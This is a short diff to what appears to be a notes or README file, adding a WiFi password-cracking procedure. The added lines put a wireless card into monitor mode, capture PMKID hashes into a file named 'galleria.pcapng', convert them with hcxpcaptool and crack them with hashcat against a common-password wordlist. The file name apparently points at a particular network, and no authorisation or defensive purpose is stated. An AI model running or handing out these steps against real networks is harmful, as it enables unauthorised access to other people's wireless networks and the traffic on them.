@@ -105,6 +105,12 @@
     make
     sudo make install
     
+    sudo airmon-ng check kill
     sudo airmon-ng start wlan1
     sudo hcxdumptool -i wlan1mon -o galleria.pcapng --enable_status=1
-   
+    
+    hcxpcaptool -E essidlist -I identitylist -U usernamelist -z galleriaHC.16800 galleria.pcapng
+    hashcat -m 16800 galleriaHC.16800 -a 0 --kernel-accel=1 -w 4 --force 'topwifipass.txt'
+ 
+ # seclists
+    sudo apt -y install seclists
